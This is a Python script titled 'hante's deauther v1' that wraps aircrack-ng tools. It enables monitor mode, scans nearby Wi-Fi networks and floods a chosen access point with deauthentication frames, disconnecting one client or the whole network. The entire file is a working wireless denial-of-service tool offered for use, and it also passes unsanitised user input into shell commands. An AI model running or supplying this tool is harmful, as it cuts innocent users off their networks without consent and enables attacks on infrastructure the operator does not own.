import os
import sys
import subprocess
import time

GREEN = '\033[1;32m'
END = '\033[0m'

def ascii():
    if os.geteuid() != 0:
        print("Please run script as root")
        sys.exit()
    cmd = "clear"
    os.system(cmd)
    print("               ...\n             ;::::;\n           ;::::; :;\n         ;:::::'   :;\n        ;:::::;     ;.\n       ,:::::'       ;           OOO\n       ::::::;       ;          OOOOO\n       ;:::::;       ;         OOOOOOOO\n      ,;::::::;     ;'         / OOOOOOO\n    ;:::::::::`. ,,,;.        /  / DOOOOOO\n  .';:::::::::::::::::;,     /  /     DOOOO\n ,::::::;::::::;;;;::::;,   /  /        DOOO\n;`::::::`'::::::;;;::::: ,#/  /          DOOO\n:`:::::::`;::::::;;::: ;::#  /            DOOO\n::`:::::::`;:::::::: ;::::# /              DOO\n`:`:::::::`;:::::: ;::::::#/               DOO\n :::`:::::::`;; ;:::::::::##                OO\n ::::`:::::::`;::::::::;:::#                OO\n `:::::`::::::::::::;'`:;::#                O\n  `:::::`::::::::;' /  / `:#\n   ::::::`:::::;'  /  /   `#\n\nhante's deauther v1\n")

def scanningAnimation(text):
    try:
        global stopAnimation
        i = 0
        while stopAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(GREEN + tempText + '\r' + END)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)



def monitor_check():
    cmd = "iwconfig"
    iwconfig_output = subprocess.check_output(cmd, shell=True)
    if "Mode:Monitor" in str(iwconfig_output):
        return True
    else:
        return False

def monitor_mode():
    
    cmd = "iwconfig | grep w"
    os.system(cmd)
    print("\n")
    interface = input("Enter the interface name:\n>")
    print("Using default interface " + interface)
    cmd = "airmon-ng start " + interface
    os.system(cmd + "> /dev/null 2>/dev/null")
    if monitor_check():
        print("Monitor mode enabled")
        return interface
    else:
        print("Monitor mode failed to enable")
        sys.exit()
        
def scan(interface):
    print("Network scan starting...")
    time.sleep(2)
    interfacemon = interface + "mon"
    cmd = "airodump-ng --band abg " + interfacemon 
    os.system(cmd)
    print("\nNetwork scan complete.")
    return interfacemon
    
def scan_target(interfacemon):
    print("\n")
    mac = input("Enter mac adress of network (2.4Ghz channel 1-13 | 5GHz channel 36-165 ):\n>")
    print("\n")
    channel = input("Enter channel of network :\n>")
    channel = str(channel)
    cmd = "airodump-ng -d " + mac + " -c " + channel + " " + interfacemon
    os.system(cmd)
    return mac

def deauth(interfacemon, networkmac):
    targetmac = input("Enter mac adress of device (enter to deauth whole network):\n>")
    deauths = input("Enter interval for deauths (0 = max):\n>")
    deauth = str(deauths)
    if targetmac == "" or targetmac == " " or targetmac == None:
        print("Deauthing whole network...")
        time.sleep(2)
        cmd = "aireplay-ng -0 " + deauths + " -a " + networkmac + " " + interfacemon
    else:
        print("Deauthing target...")
        time.sleep(2)
        cmd = "aireplay-ng -0 " + deauths + " -a " + networkmac + " -c " + targetmac + " " + interfacemon
    os.system(cmd)
    print("\nDeauth complete, deactivating monitor mode...")
    cmd = "airmon-ng stop " + interfacemon
    os.system(cmd)

def main():
    ascii()
    interface = monitor_mode()
    interfacemon = scan(interface)
    networkmac = scan_target(interfacemon)
    deauth(interfacemon, networkmac)

main()
